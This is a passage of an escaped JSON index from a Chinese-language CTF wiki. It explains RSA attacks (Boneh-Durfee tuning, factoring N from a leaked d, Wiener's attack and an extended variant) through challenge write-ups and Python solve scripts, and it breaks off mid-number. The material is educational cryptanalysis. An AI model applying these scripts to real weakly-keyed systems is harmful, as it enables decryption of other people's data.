<p>\u6240\u4ee5\u5176\u5b9e\u8fd9\u91cc\u5c31\u4e58\u4e86\u4e00\u4e2a\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u5c31\u53ef\u4ee5\u679a\u4e3e\u4e00\u4e0b\u4e58\u4e86\u4ec0\u4e48\uff0c\u5e76\u4fee\u6539 e1=e*ppp\uff0c\u5176\u5b9e\u5c31\u56de\u5f52\u5230\u6807\u51c6\u7684 Boneh and Durfee attack\u3002</p> <p>\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 https://github.com/mimoo/RSA-and-LLL-attacks \u7684\u811a\u672c\u4e5f\u4e0d\u884c\uff0c\u5fc5\u987b\u5f97\u63d0\u9ad8 m\uff0c\u57fa\u672c\u5f97\u63d0\u5230 8\uff0c\u8fd9\u6837\u4ecd\u7136\u4e0d\u662f\u5f88\u7a33\u5b9a\u3002</p> <p>\u5982\u679c\u4ed4\u7ec6\u5c1d\u8bd5\u5c1d\u8bd5\u7684\u8bdd\uff0c\u5c31\u4f1a\u53d1\u73b0 e1&gt;N\uff0c\u8fd9\u770b\u8d77\u6765\u95ee\u9898\u4e0d\u5927\uff0c\u4f46\u662f\u539f\u811a\u672c\u91cc\u5047\u8bbe\u7684\u6570\u503c\u662f e&lt;N \u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8fdb\u884c\u9002\u5f53\u7684\u4fee\u6539\u9884\u4f30\u7684\u4e0a\u4e0b\u754c</p> <pre><code>    X = 2*floor(N^delta)  # this _might_ be too much\n    Y = floor(N^(1/2))    # correct if p, q are ~ same size\n</code></pre> <p>\u6839\u636e\u4e0a\u8ff0\u63a8\u5bfc\uff0c\u4e0a\u4e0b\u754c\u5e94\u8be5\u4e3a</p> <p>|k|&lt;\\frac{2ed}{\\varphi(N)}&lt;\\frac{3ed}{N}=3*\\frac{e}{N}*d&lt;3*\\frac{e}{N}*N^{delta}</p> <p>|y|&lt;2*N^{0.5}</p> <p>\u6700\u540e\u4e3b\u8981\u4fee\u6539\u4e86 m \u548c X \u7684\u4e0a\u754c</p> <pre><code>    delta = .262 # this means that d &lt; N^delta\n\n    #\n    # Lattice (tweak those values)\n    #\n\n    # you should tweak this (after a first run), (e.g. increment it until a solution is found)\n    m = 8 # size of the lattice (bigger the better/slower)\n\n    # you need to be a lattice master to tweak these\n    t = int((1-2*delta) * m)  # optimization from Herrmann and May\n    X = floor(3*e/N*N^delta) #4*floor(N^delta)  # this _might_ be too much\n    Y = floor(2*N^(1/2))    # correct if p, q are ~ same size\n</code></pre> <p>\u6700\u540e\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c</p> <pre><code>[DEBUG] Received 0x1f bytes:\n    'Succcess!\\n'\n'OOO{Br3akingL!mits?}\\n'\nOOO{Br3akingL!mits?}\n</code></pre> <p>\u4e0d\u5f97\u4e0d\u8bf4\u8fd9\u4e2a\u9898\u76ee\uff0c\u771f\u7684\u662f\u9700\u8981\u591a\u6838\u670d\u52a1\u5668\u3002\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_19","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li> <p>Survey: Lattice Reduction Attacks on RSA</p> </li> <li> <p>An Introduction to Coppersmith\u2019s method and Applications in Cryptology</p> </li> <li> <p>https://www.ruanx.net/coppersmith/</p> </li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/","title":"\u79c1\u94a5 d \u76f8\u5173\u653b\u51fb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#d_1","title":"d \u6cc4\u9732\u653b\u51fb","text":""},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_1","title":"\u653b\u51fb\u539f\u7406","text":"<p>\u9996\u5148\u5f53 d \u6cc4\u9732\u4e4b\u540e\uff0c\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u89e3\u5bc6\u6240\u6709\u52a0\u5bc6\u7684\u6d88\u606f\u3002\u6211\u4eec\u751a\u81f3\u8fd8\u53ef\u4ee5\u5bf9\u6a21\u6570 N \u8fdb\u884c\u5206\u89e3\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b</p> <p>\u6211\u4eec\u77e5\u9053 ed \\equiv 1 \\bmod \\varphi(n)\uff0c\u90a3\u4e48\u5b58\u5728\u4e00\u4e2a k \u4f7f\u5f97 </p>  ed-1=k\\varphi(n)  <p>\u53c8 \\forall a\\in {Z}_n^*\uff0c\u6ee1\u8db3a^{ed-1}\\equiv1(\\bmod n)\u3002\u4ee4</p>  ed-1=2^st  <p>\u5176\u4e2d\uff0ct \u662f\u4e00\u4e2a\u5947\u6570\u3002\u7136\u540e\u53ef\u4ee5\u8bc1\u660e\u5bf9\u4e8e\u81f3\u5c11\u4e00\u534a\u7684 a\\in {Z}_n^*\uff0c\u5b58\u5728\u4e00\u4e2a i\\in[1,s]\uff0c\u4f7f\u5f97 </p>  a^{2^{i-1}t}\\not\\equiv\\pm1(\\bmod n),a^{2^{i}t}\\equiv1(\\bmod n)  <p>\u6210\u7acb\u3002\u5982\u679c a,i \u6ee1\u8db3\u4e0a\u8ff0\u6761\u4ef6\uff0cgcd(a^{2^{i-1}t}-1,n)\u662f n \u7684\u4e00\u4e2a\u975e\u5e73\u51e1\u56e0\u5b50\uff0c\u6240\u4ee5\u53ef\u4ee5\u5bf9 n \u8fdb\u884c\u66b4\u529b\u5206\u89e3\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_2","title":"\u5de5\u5177","text":"<p>\u5229\u7528\u4ee5\u4e0b\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u8ba1\u7b97</p> <ul> <li>RsaConverter.exe (https://sourceforge.net/projects/rsaconverter/ , for windows )</li> <li>rsatool.py(\u5206\u89e3\u539f\u7406\u5982\u4e0a)</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#2017-hitb-hack-in-the-card-ii","title":"2017 HITB - hack in the card II","text":"<p>The second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -&gt; publickey.pem). However it seems that they missed something...... Can you decrypt the following hex-encoded ciphertext this time? <pre><code>016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977\n</code></pre></p> <p>\u8fd9\u9898\u662f\u63a5\u7eed 2017 HITB - hack in the card I \u7684\u4e00\u9053\u9898\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 <code>openssl</code> \u67e5\u770b <code>publickey.pem</code> \u7684\u516c\u94a5\uff0c\u53d1\u73b0\u5b83\u7684 N \u4e0e\u4e0a\u4e00\u9053\u9898\u7684 N \u76f8\u540c\uff0c\u5e76\u4e14\u4e0a\u9898\u7684 N\uff0ce\uff0cd \u5df2\u77e5\u3002\u7531\u6b64\u53ef\u76f4\u63a5\u4f7f\u7528\u4e0a\u9762\u7684 <code>rsatool.py</code> \u5f97\u5230 p\uff0cq\uff0c\u5e76\u901a\u8fc7\u672c\u9898\u7684 e \u8ba1\u7b97\u51fa e \u5f97\u5230\u660e\u6587\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#wiener-attack","title":"Wiener-Attack \u53ca\u5176\u6269\u5c55","text":"<p>\u6761\u4ef6\uff1a\u5df2\u77e5n, e\uff0c\u4e14e\u8f83\u5927\u6216d \u6bd4\u8f83\u5c0f\uff08d&lt;\\frac{1}{3}N^{\\frac{1}{4}}\uff09</p> <p>\u4f8b\u5982\u4ee5\u4e0b<code>little_trick</code>\u9636\u6bb5d1\u662f256\u4f4d\uff0cn\u662f2048\u4f4d\uff0c\u8bf4\u660ee\u8f83\u5927\uff0c\u53ef\u4ee5\u76f4\u63a5\u8dd1\u811a\u672c\u5f97\u5230d</p> <pre><code>from Crypto.Util.number import *\nfrom libnum import *\nfrom secret import flag,special,p,q,n\n\n\ndef little_trick(msg):\n    p1 = getPrime(1024)\n    q1 = getPrime(1024)\n    n1 = p1 * q1\n    d1=random.randint(1,2**256)\n    e1=inverse(d1,(p1-1)*(q1-1))\n    print(n1)\n    print(e1)\n    print(pow(msg,e1,n1))\n\n\ndef real_trick():\n    assert (special &gt; (ord(\"*\")*100) and gcd(special,(p-1)*(q-1))!=1 )\n    print(n)\n    print(pow(libnum.s2n(flag),special,n))\n\n\nif __name__ == '__main__':\n    little_trick(p-1)\n    real_trick()\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_3","title":"\u5de5\u5177","text":"<ul> <li>https://github.com/pablocelayes/rsa-wiener-attack</li> <li>https://github.com/orisano/owiener</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_4","title":"\u653b\u51fb\u539f\u7406","text":""},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_5","title":"\u8fde\u5206\u6570","text":""},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_6","title":"\u6e10\u8fdb\u5206\u6570","text":"<p>\u6e10\u8fdb\u5206\u6570\u662f\u6307\u4e00\u4e2a\u4ee5\u5206\u6570\u7684\u5f62\u5f0f\u51fa\u73b0\u7684\u4e24\u4e2a\u6709\u7406\u6570\u7684\u5546\u7684\u8fd1\u4f3c\u503c\uff0c\u5982\u6211\u4eec\u719f\u77e5\u7684\u5bc6\u7387355/113\u548c\u7ea6\u738722/7\u5c31\u662f3.1415926/1\u7684\u6e10\u8fdb\u5206\u6570.</p> <p>\u8fde\u5206\u6570\u5c55\u5f00\u7684\u6e10\u8fdb\u5206\u6570\u6982\u5ff5\u6709\u4e9b\u4e0d\u540c\uff0c\u4f8b\u5982\\dfrac{543}{236}\u7684\u8fde\u5206\u6570\u5c55\u5f00\u4e3a</p>  2+\\frac{1}{3+\\frac{1}{3+\\frac{1}{11+1/2}}}  <p>\u5219\u7b2c\u4e00\u4e2a\u6e10\u8fdb\u5206\u6570\u662f 2\uff0c\u7b2c\u4e8c\u4e2a\u6e10\u8fdb\u5206\u6570\u662f 2+\\dfrac 13\uff0c\u7b2c\u4e09\u4e2a\u6e10\u8fdb\u5206\u6570\u662f 2+\\dfrac{1}{3+1/3}\uff0c\u4ee5\u6b64\u7c7b\u63a8.</p>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_7","title":"\u5b9a\u7406","text":"<p>Wiener Attack\u57fa\u4e8e\u4ee5\u4e0b\u5b9a\u7406\uff1a</p> <p>\u82e5 \\xi \u662f\u4e00\u4e2a\u5b9e\u6570\uff0ca,b \u4e92\u7d20\uff0c\u4e14\u6ee1\u8db3</p>  |\\xi -\\frac ab| \\lt \\frac 1{2b^2}  <p>\u5219 \\dfrac ab \u662f \\xi  \u7684\u8fde\u5206\u6570\u5c55\u5f00\u7684\u4e00\u4e2a\u6e10\u8fdb\u5206\u6570.</p> <p>Wiener Attack \u7684\u6761\u4ef6\u662f q&lt;p&lt;2q,~d&lt;\\frac 13N^{1/4}\uff0c\u7531 ed-k\\phi(N)=1\uff0c\u6709</p>  \\lvert \\frac{e}{\\phi(N)} - \\frac kd\\rvert=\\frac 1{d\\phi(N)}   <p>\u56e0\u4e3a\\dfrac 1{d\\phi(N)} \u5f88\u5c0f\uff0c\u6240\u4ee5\u53ef\u4ee5\u8ba4\u4e3a\\dfrac kd\u662f\\dfrac e{\\phi(N)}\u7684\u8fd1\u4f3c\uff0c\u4e14\u5728p,q\u5f88\u5927\u65f6\uff0c\\phi(N)\u548cN\u63a5\u8fd1.</p> <p>\u56e0\u4e3a\\phi(N)=N-p-q-1 \u4e14 p+q-1&lt;3\\sqrt N\uff08\u5e94\u8be5\u662f\u7531 q&lt;p&lt;2q \u63a8\u51fa\u7684\uff09\uff0c\u6211\u4eec\u5f97\u5230 |N-\\phi(N)|&lt;3\\sqrt N.</p> <p>\u7528 N \u4ee3\u66ff \\phi(N)\uff0c\u53ef\u4ee5\u5f97\u5230\uff1a</p>  \\begin{align} |\\frac eN - \\frac kd|&amp;=|\\frac {ed-k\\phi(N)-kN+k\\phi(N)}{Nd}|\\\\ &amp;=|\\frac {1-k(N-\\phi(N))}{Nd}|\\\\ &amp;\\le |\\frac {3k\\sqrt N}{Nd}|=\\frac {3k}{d\\sqrt N} \\end{align}  <p>\u56e0\u4e3a k\\phi(N)=ed-1 &lt; ed\uff0c\u4e14 e &lt;\\phi(N)\uff0c\u6240\u4ee5 k&lt;d&lt;\\frac 13 N^{1/4}. \u5219</p>  |\\frac eN - \\frac kd| \\le \\frac 1{d\\sqrt[4]{N}}&lt;\\frac 1{2d^2}  <p>\u7531\u4e0a\u9762\u7684\u5b9a\u7406\u53ef\u4ee5\u5f97\u5230\uff0c\\dfrac kd \u662f \\dfrac eN \u7684\u8fde\u5206\u6570\u5c55\u5f00\u7684\u4e00\u4e2a\u6e10\u8fdb\u5206\u6570\uff0c\u5373 \\dfrac kd \u5c31\u5728\u8fde\u5206\u6570\u5c55\u5f00\u7684\u6e10\u8fdb\u5206\u6570\u4e2d.</p> <p>\u8fde\u5206\u6570\u5c55\u5f00\u53ef\u4ee5\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u5b8c\u6210\uff0c\u53ea\u9700\u8981\u518d\u904d\u5386\u5404\u4e2a\u6e10\u8fdb\u5206\u6570\uff0c\u8bbe\u67d0\u4e00\u6e10\u8fdb\u5206\u6570\u4e3a \\dfrac uv\uff0c\u5224\u65ad ev-1 \u662f\u5426\u6574\u9664 u\uff08\u5373 ed-1 \u662f\u5426\u6574\u9664 k\uff09\uff0c\u82e5\u80fd\u6574\u9664\uff0c\u5219\u5f53\u524d\u7684 u,v \u5c31\u662f k,d.</p>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#2020rrrrrrrsa","title":"\u6269\u5c55\u7528\u6cd5 [\u7f8a\u57ce\u676f 2020]RRRRRRRSA","text":"<p>\u9898\u76ee\u5982\u4e0b\uff08\u4e3a\u8282\u7701\u7a7a\u95f4\uff0c\u5220\u9664\u4e86\u8f93\u51fa\u6570\u636e\u90e8\u5206\u7684\u4ee3\u7801\uff0c\u8f93\u51fa\u7684\u662f\u4e24\u7ec4<code>N, E, c</code></p> <pre><code>import hashlib\nimport sympy\nfrom Crypto.Util.number import *\n\nflag = 'GWHT{************}'\n\nflag1 = flag[:19].encode()\nflag2 = flag[19:].encode()\nassert(len(flag) == 38)\n\nP1 = getPrime(1038)\nP2 = sympy.nextprime(P1)\nassert(P2 - P1 &lt; 1000)\n\nQ1 = getPrime(512)\nQ2 = sympy.nextprime(Q1)\n\nN1 = P1 * P1 * Q1\nN2 = P2 * P2 * Q2\n\nE1 = getPrime(1024)\nE2 = sympy.nextprime(E1)\n\nm1 = bytes_to_long(flag1)\nm2 = bytes_to_long(flag2)\n\nc1 = pow(m1, E1, N1)\nc2 = pow(m2, E2, N2)\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_8","title":"\u5206\u6790","text":"<p>\u5df2\u77e5 N_1=p_1^2q_1, N_2=p_2^2q_2\uff0c\u5219</p>  \\frac {N_1}{N_2}=(\\frac {p_1}{p_2})^2\\frac {q_1}{q_2}&lt;\\frac {q_1}{q_    2}&lt;1  <p>\u5df2\u77e5 p_2-p_1&lt;1000\uff0c\u53ef\u4ee5\u8ba4\u4e3a \\dfrac {N_1}{N_2} \u548c \\dfrac {q_1}{q_2} \u5f88\u63a5\u8fd1\uff0c\u731c\u6d4b</p>  |\\frac {N_1}{N_2}-\\frac {q_1}{q_2}|&lt;\\frac 1{2q_2^2}  <p>\uff08\u5e94\u8be5\u53ef\u4ee5\u8bc1\u660e\uff0c\u4f46\u662f\u76f4\u63a5\u8bd5\u8bd5\u80fd\u4e0d\u80fd\u89e3\u66f4\u7701\u65f6\u95f4\uff09</p> <p>\u4e8e\u662f\u5bf9 \\dfrac {N_1}{N_2} \u8fdb\u884c\u8fde\u5206\u6570\u5c55\u5f00\uff0c\u53d1\u73b0\u6e10\u8fdb\u5206\u6570\u4e2d\u6709 \\dfrac {q_1}{q_2}\uff0c\u4e4b\u540e\u5373\u53ef\u89e3\u5bc6.</p>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#exp","title":"EXP","text":"<pre><code>N1=\nN2=\nE1=\nE2=\nc1=\nc2=\n\n# \u5c06\u5206\u6570x/y\u8f6c\u4e3a\u8fde\u5206\u6570\u7684\u5f62\u5f0f\ndef get_contined_fraction(x, y):\n    continued_fraction = []\n    while y:\n        continued_fraction.append(x // y)\n        x, y = y, x % y\n    return continued_fraction\n\n# \u8f93\u5165\uff1a\u8fde\u5206\u6570\u5217\u8868\n# \u8f93\u51fa\uff1a\u8fde\u5206\u6570\u7684\u6e10\u8fdb\u5206\u6570\u5206\u5b50num\u548c\u5206\u6bcdden\ndef get_convergent(continued_fraction):\n    num, den = 1, 0\n    # \u4ece\u540e\u9762\u5f80\u524d\u5faa\u73af\n    for i in continued_fraction[::-1]:\n        den, num = num, i * num + den\n    return den, num\n\n# \u6c42\u89e3\u6bcf\u4e2a\u6e10\u8fdb\u5206\u6570\ndef get_all_convergents(x, y):\n    res = get_contined_fraction(x, y)\n    # \u5c06\u8fde\u5206\u6570\u7684\u7ed3\u679c\u9010\u4e00\u622a\u53d6\u4ee5\u6c42\u6e10\u8fdb\u5206\u6570\n    res = list(map(get_convergent, (res[0:i] for i in range(1, len(res)))))\n    return res\n\ndef expand_wiener_attack(n1, n2):\n    for (q2, q1) in get_all_convergents(n1, n2):  \n        # \u627e\u5230\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u6e10\u8fdb\u5206\u6570\n        if q1 == 0:\n            # \u53ef\u80fd\u4f1a\u51fa\u73b0\u8fde\u5206\u6570\u7684\u7b2c\u4e00\u4e2a\u4e3a0\u7684\u60c5\u51b5\uff0c\u6392\u9664\n            continue\n        if n1 % q1 == 0 and q1 != 1:\n            return (q1, q2)\n    print(\"Failed!\")\n\nq1, q2 = expand_wiener_attack(N1, N2)\n# print(f\"q1 = {q1}\\nq2 = {q2}\")\n\nassert N2 % q2 == 0\np1 = int(iroot(N1 // q1, 2)[0])\np2 = next_prime(p1)\nassert N2 % p2 == 0\n\nphi1 = (p1 * p1 - p1) * (q1 - 1)\nphi2 = (p2 * p2 - p2) * (q2 - 1)\nd1 = invert(E1, phi1)\nd2 = invert(E2, phi2)\n\nm1 = n2s(int(powmod(c1, d1, N1)))\nm2 = n2s(int(powmod(c2, d2, N2)))\nm = m1 + m2\nprint(m)\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_9","title":"\u7efc\u5408\u4f8b\u5b50","text":""},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#2016-hctf-rsa1","title":"2016 HCTF RSA1","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d RSA 1 - Crypto So Interesting \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\uff0c\u6e90\u4ee3\u7801\u94fe\u63a5\u3002</p> <p>\u9996\u5148\u5148\u7ed5\u8fc7\u7a0b\u5e8f\u7684 proof \u90e8\u5206\uff0c\u5dee\u4e0d\u591a\u4f7f\u7528\u4e00\u4e9b\u968f\u673a\u7684\u6570\u636e\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u3002</p> <p>\u5176\u6b21\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u4ee3\u7801\u90e8\u5206\uff0c\u7a0b\u5e8f\u662f\u6839\u636e\u6211\u4eec\u7684 token \u6765\u83b7\u53d6 flag \u7684\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u5229\u7528\u6e90\u4ee3\u7801\u4e2d\u63d0\u4f9b\u7684 token\u3002</p> <pre><code>    print \"This is a RSA Decryption System\"\n    print \"Please enter Your team token: \"\n    token = raw_input()\n    try:\n        flag = get_flag(token)\n        assert len(flag) == 38\n    except:\n        print \"Token error!\"\n        m_exit(-1)\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u9996\u5148\u77e5\u9053 n=pq\uff0c\u6211\u4eec\u518d\u6765\u4f60\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u8fd9\u4e2a e\uff0cd \u662f\u5982\u4f55\u5f97\u5230\u7684\u3002</p> <pre><code>    p=getPrime(2048)\n    q=getPrime(2048)\n    n = p * q\n    e, d = get_ed(p, q)\n    print \"n: \", hex(n)\n    print \"e: \", hex(e)\n</code></pre> <p><code>get_ed</code> \u51fd\u6570\u5982\u4e0b</p> <pre><code>def get_ed(p, q):\n    k = cal_bit(q*p)\n    phi_n = (p-1)*(q-1)\n    r = random.randint(10, 99)\n    while True:\n        u = getPrime(k/4 - r)\n        if gcd(u, phi_n) != 1:\n            continue\n        t = invmod(u, phi_n)\n        e = pi_b(t)\n        if gcd(e, phi_n) == 1:\n            break\n    d = invmod(e, phi_n)\n    return (e, d)\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u5f97\u5230\u7684 u \u7684\u4f4d\u6570\u6bd4 n \u7684\u4f4d\u6570\u7684\u56db\u5206\u4e4b\u4e00\u8fd8\u8981\u5c11\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u5dee\u4e0d\u591a\u6ee1\u8db3\u4e86 Wiener's Attack \u4e86\u3002\u800c\u4e14\u6211\u4eec\u8ba1\u7b97\u51fa\u6765\u7684 u\uff0ct\uff0ce\uff0cd \u8fd8\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6</p>  \\begin{align*} ut &amp;\\equiv 1  \\bmod \\varphi(n) \\\\ et &amp;\\equiv 1 \\bmod bt \\\\ ed &amp;\\equiv 1 \\bmod \\varphi(n) \\end{align*}  <p>\u6839\u636e\u9898\u4e2d\u7ed9\u51fa\u7684\u6761\u4ef6\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 n\uff0ce\uff0cbt\u3002</p> <p>\u6240\u4ee5\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u7b2c\u4e8c\u4e2a\u5f0f\u5b50\u77e5\u9053 e\u3002\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u5229\u7528\u7b2c\u4e00\u4e2a\u5f0f\u5b50\u8fdb\u884c Wiener's Attack\uff0c\u83b7\u53d6 u\u3002\u8fdb\u800c\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u79c1\u94a5\u6307\u6570\u6cc4\u9732\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u5206\u89e3 N \u4ece\u800c\u5f97\u5230 p\uff0cq\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230 d \u4e86\u3002</p> <p>\u9996\u5148\u6211\u4eec\u7ed5\u8fc7 proof \u5f97\u5230\u4e86 N\uff0ce\uff0c\u52a0\u5bc6\u540e\u7684 flag \u5982\u4e0b</p> <pre><code>n:  0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451\ne:  0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1\nflag:  0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df\n</code></pre> <p>\u5176\u6b21\u4f7f\u7528\u5982\u4e0b\u65b9\u6cd5\u8fdb\u884c Wiener's Attack \u5f97\u5230 u\uff0c\u5982\u4e0b</p> <pre><code>if __name__ == \"__main__\":\n    bt = 536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273L\n    e = 0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f